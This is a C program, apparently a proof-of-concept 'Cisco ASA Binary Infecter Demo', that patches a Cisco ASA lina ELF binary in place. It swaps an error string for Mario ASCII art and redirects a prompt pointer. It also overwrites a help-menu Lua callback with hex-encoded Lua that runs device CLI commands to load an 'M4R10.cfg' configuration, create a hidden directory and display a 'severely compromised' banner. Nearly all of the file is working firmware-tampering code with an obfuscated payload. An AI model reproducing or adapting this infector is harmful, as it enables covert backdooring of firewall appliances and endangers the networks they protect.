// The ELF section discovery is based on https://github.com/elftoolchain/elftoolchain/blob/master/documentation/libelf-by-example/prog4.txt
#include <err.h>
#include <fcntl.h>
#include <gelf.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sysexits.h>
#include <unistd.h>
#include <inttypes.h>
#include <byteswap.h>


int main(int argc, char **argv)
{
    int fd;
    Elf *e;
    char *name;
    char *pos;
        long NoClusterStrAddr,LongStrAddr,NoClusterMemAddr,LongStrMemAddr;

        Elf_Scn *scn;
    Elf_Data *data;
    GElf_Shdr shdr;
    size_t shstrndx,numRead;
        long file_offset, load_offset, bufsize;

        unsigned char byteArray[8];
        unsigned char replacebyteArray[8];


        unsigned char marioAscii[153] = {
        0x20, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x88, 0xE2, 0x96,
        0x88, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x84, 0xE2, 0x96, 0x84, 0x20, 0x0D,
        0x0A, 0x20, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x80, 0xE2, 0x96, 0x88, 0xE2,
        0x96, 0x80, 0xE2, 0x96, 0x90, 0xE2, 0x94, 0x94, 0xE2, 0x94, 0x80, 0xE2,
        0x94, 0x90, 0xE2, 0x96, 0x91, 0xE2, 0x96, 0x91, 0x0D, 0x0A, 0x20, 0xE2,
        0x96, 0x88, 0xE2, 0x96, 0x84, 0xE2, 0x96, 0x90, 0xE2, 0x96, 0x8C, 0xE2,
        0x96, 0x84, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x84, 0xE2, 0x94, 0x98, 0xE2,
        0x96, 0x88, 0xE2, 0x96, 0x88, 0x0D, 0x0A, 0x20, 0xE2, 0x94, 0x94, 0xE2,
        0x96, 0x84, 0xE2, 0x96, 0x84, 0xE2, 0x96, 0x84, 0xE2, 0x96, 0x84, 0xE2,
        0x96, 0x84, 0xE2, 0x94, 0x98, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x88, 0xE2,
        0x96, 0x88, 0x0D, 0x0A, 0x20, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x88, 0xE2,
        0x96, 0x92, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x92, 0xE2,
        0x96, 0x88, 0xE2, 0x96, 0x88, 0xE2, 0x96, 0x80, 0x00
};



        if (elf_version(EV_CURRENT) == EV_NONE)
                errx(EX_SOFTWARE, "ELF library initialization failed: %s",
                    elf_errmsg(-1));

        if ((fd = open(argv[1], O_RDONLY, 0)) < 0)
                err(EX_NOINPUT, "open \%s\" failed", argv[1]);

        if ((e = elf_begin(fd, ELF_C_READ, NULL)) == NULL)
                errx(EX_SOFTWARE, "elf_begin() failed: %s.",
                    elf_errmsg(-1));

        if (elf_kind(e) != ELF_K_ELF)
                errx(EX_DATAERR, "%s is not an ELF object.", argv[1]);

        if (elf_getshstrndx(e, &shstrndx) == 0)
                errx(EX_SOFTWARE, "getshstrndx() failed: %s.",
                    elf_errmsg(-1));

        scn = NULL;
        while ((scn = elf_nextscn(e, scn)) != NULL) {
                        if (gelf_getshdr(scn, &shdr) != &shdr)
                        errx(EX_SOFTWARE, "getshdr() failed: %s.",
                            elf_errmsg(-1));

            if ((name = elf_strptr(e, shstrndx, shdr.sh_name)) == NULL)
                        errx(EX_SOFTWARE, "elf_strptr() failed: %s.",
                            elf_errmsg(-1));

                        if(strcmp(name,".rodata")==0){
                                file_offset = (long *)shdr.sh_offset;
                                load_offset = (long *)shdr.sh_addr;

                                //printf("FILE OFFSET %p \N MEM ADDR OFFSET %p\n",offset,align);
                                printf("\n\t\t [x] Cisco ASA Binary Infecter Demo!!!!!!!! [x] \n");
                                printf("%s\n",marioAscii);
                                printf("[x] Found %s .rodata offset at 0x%lx \n",argv[1],file_offset);
                                printf("[x] Found %s .rodata address at 0x%lx\n",argv[1],load_offset);
                        }

                }


        (void) elf_end(e);
        (void) close(fd);

        char *lina_buff = NULL;
        numRead =0;
        fd = fopen(argv[1], "r+");
        if (fd != NULL) {
                if (fseek(fd, 0L, SEEK_END) == 0) {
                        bufsize = ftell(fd);
                        if (bufsize == -1) { printf("11"); }
                        lina_buff = malloc(sizeof(char) * (bufsize + 1));
                        fseek(fd, 0L, SEEK_SET);
                        numRead = fread(lina_buff, sizeof(char), bufsize, fd);
                        if (numRead == 0) {
                                fputs("Error reading file", stderr);
                        }
                }
                unsigned char NoClusterStr[9] = {0x4E,0x6F,0x43,0x6C,0x75,0x73,0x74,0x65,0x72}; // NoCluster (string goes to prompt)
                pos = memmem(lina_buff, numRead, NoClusterStr, 9);
                if(pos){
                        printf("[*] Found prompt string at file offset 0x%x !\n",pos-lina_buff);
                        NoClusterStrAddr = pos-lina_buff;
                        NoClusterMemAddr = NoClusterStrAddr-file_offset;
                        NoClusterMemAddr = load_offset+NoClusterMemAddr;
                        printf("[*] Prompt string calculated at address 0x%x !\n",NoClusterMemAddr);

                        byteArray[0] = (int)'\xC7';
                        byteArray[1] = (int)'\x44';
                        byteArray[2] = (int)'\x24';
                        byteArray[3] = (int)'\x14';
                        byteArray[4] = (int)((NoClusterMemAddr & 0XFF));
                        byteArray[5] = (int)((NoClusterMemAddr >> 8) & 0XFF);
                        byteArray[6] = (int)((NoClusterMemAddr >> 16) & 0xFF) ;
                        byteArray[7] = (int)((NoClusterMemAddr >> 24) & 0xFF) ;





                }
                unsigned char LongStr[30] = {
                0x46, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x63, 0x72,
                0x65, 0x61, 0x74, 0x65, 0x20, 0x49, 0x4B, 0x45, 0x76, 0x32, 0x20, 0x50,
                0x72, 0x6F, 0x6F, 0x73, 0x61, 0x6C
                };// Failed to create IKEv2 Proosal (string to replace with mario ascii )
                pos = memmem(lina_buff, numRead, LongStr, 30);
                if(pos){
                        printf("[*] Found long string at  file offset 0x%x !\n",pos-lina_buff);
                        LongStrAddr = pos-lina_buff;
                        LongStrMemAddr = LongStrAddr-file_offset;
                        LongStrMemAddr = load_offset+LongStrMemAddr;
                        printf("[*] Long string calculated at address 0x%x !\n",LongStrMemAddr);
                        memcpy(pos,marioAscii,sizeof(marioAscii));
                        printf("[*] Replaced a long string with ascii art!!\n");

                        replacebyteArray[0] = (int)'\xC7';
                        replacebyteArray[1] = (int)'\x44';
                        replacebyteArray[2] = (int)'\x24';
                        replacebyteArray[3] = (int)'\x14';
                        replacebyteArray[4] = (int)((LongStrMemAddr & 0XFF));
                        replacebyteArray[5] = (int)((LongStrMemAddr >> 8) & 0XFF);
                        replacebyteArray[6] = (int)((LongStrMemAddr >> 16) & 0xFF);
                        replacebyteArray[7] = (int)((LongStrMemAddr >> 24) & 0xFF);

                        printf("[*] Byte code search pattern:      \\xc7\\x44\\x24\\x14\\x%x\\x%x\\x%x\\x%x\n",byteArray[4],byteArray[5],byteArray[6],byteArray[7]);
                        printf("[*] Replacement byte code pattern: \\xc7\\x44\\x24\\x14\\x%x\\x%x\\x%x\\x%x\n",replacebyteArray[4],replacebyteArray[5],replacebyteArray[6],replacebyteArray[7]);

                }

                pos = memmem(lina_buff, numRead, byteArray, 8);
                if(pos){
                        printf("[*] Found prompt bytecode at file offset 0x%x !\n",pos-lina_buff);
                        memcpy(pos,replacebyteArray,sizeof(replacebyteArray));
                        printf("[*] Replaced prompt bytecode with ascii art location!\n");

                }
				unsigned char exec__help_user_alert_cb[27] = {
				0x65, 0x78, 0x65, 0x63, 0x5F, 0x5F, 0x68, 0x65, 0x6C, 0x70, 0x5F, 0x75,
				0x73, 0x65, 0x72, 0x5F, 0x61, 0x6C, 0x65, 0x72, 0x74, 0x5F, 0x63, 0x62,
				0x28, 0x29, 0x0A
				};

unsigned char someLua[218] = {
	0x65, 0x78, 0x65, 0x63, 0x5F, 0x5F, 0x68, 0x65, 0x6C, 0x70, 0x5F, 0x75,
	0x73, 0x65, 0x72, 0x5F, 0x61, 0x6C, 0x65, 0x72, 0x74, 0x5F, 0x63, 0x62,
	0x28, 0x29, 0x0A, 0x63, 0x6C, 0x69, 0x2E, 0x65, 0x78, 0x65, 0x63, 0x75,
	0x74, 0x65, 0x5F, 0x63, 0x6C, 0x69, 0x5F, 0x63, 0x6F, 0x6D, 0x6D, 0x61,
	0x6E, 0x64, 0x28, 0x22, 0x65, 0x78, 0x65, 0x63, 0x22, 0x2C, 0x20, 0x22,
	0x63, 0x6F, 0x70, 0x79, 0x20, 0x2F, 0x6E, 0x6F, 0x20, 0x4D, 0x34, 0x52,
	0x31, 0x30, 0x2E, 0x63, 0x66, 0x67, 0x20, 0x72, 0x75, 0x6E, 0x22, 0x2C,
	0x20, 0x22, 0x2E, 0x78, 0x22, 0x29, 0x0A, 0x63, 0x6C, 0x69, 0x2E, 0x65,
	0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x5F, 0x63, 0x6C, 0x69, 0x5F, 0x63,
	0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x28, 0x22, 0x65, 0x78, 0x65, 0x63,
	0x22, 0x2C, 0x20, 0x22, 0x6D, 0x6B, 0x64, 0x69, 0x72, 0x20, 0x2F, 0x6E,
	0x6F, 0x20, 0x2E, 0x4D, 0x34, 0x52, 0x31, 0x30, 0x22, 0x2C, 0x20, 0x22,
	0x2E, 0x78, 0x22, 0x29, 0x0A, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x20, 0x68,
	0x65, 0x6C, 0x70, 0x3D, 0x22, 0x54, 0x68, 0x69, 0x73, 0x20, 0x43, 0x69,
	0x73, 0x63, 0x6F, 0x20, 0x41, 0x53, 0x41, 0x20, 0x69, 0x73, 0x20, 0x73,
	0x65, 0x76, 0x65, 0x72, 0x65, 0x6C, 0x79, 0x20, 0x63, 0x6F, 0x6D, 0x70,
	0x72, 0x6F, 0x6D, 0x69, 0x73, 0x65, 0x64, 0x2E, 0x2E, 0x2E, 0x22, 0x0A,
	0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x20, 0x62, 0x6C, 0x61, 0x68, 0x20, 0x3D,
	0x5B, 0x5B
};



				
				pos = memmem(lina_buff, numRead, exec__help_user_alert_cb, 27);
				 if(pos){
                        printf("[*] Inserting show-mario menu callback at file offset 0x%x !\n",pos-lina_buff);
                        memcpy(pos,someLua,sizeof(someLua));

                }
				
			unsigned char original_menu[26] = {
				0x22, 0x68, 0x65, 0x6C, 0x70, 0x22, 0x2C, 0x0A, 0x62, 0x6E, 0x66, 0x20,
				0x3D, 0x20, 0x22, 0x75, 0x73, 0x65, 0x72, 0x2D, 0x61, 0x6C, 0x65, 0x72,
				0x74, 0x22
			};


		unsigned char new_menu[26] = {
					0x22, 0x73, 0x68, 0x6F, 0x77, 0x22, 0x2C, 0x0A, 0x62, 0x6E, 0x66, 0x20,
					0x3D, 0x20, 0x22, 0x6D, 0x61, 0x72, 0x69, 0x6F, 0x2D, 0x6C, 0x6F, 0x67,
					0x6F, 0x22
		};
			pos = memmem(lina_buff, numRead, original_menu, 26);
			 if(pos){
                       printf("[*] Inserting show-mario menu option at file offset 0x%x !\n",pos-lina_buff);
                       memcpy(pos,new_menu,sizeof(new_menu));

                }
				
				

                fseek(fd, 0, SEEK_SET);
                fwrite(lina_buff, sizeof(char), numRead, fd);
                printf("[*] Done!!\n");
                fclose(fd);
        }
        free(lina_buff);



        exit(EX_OK);
}
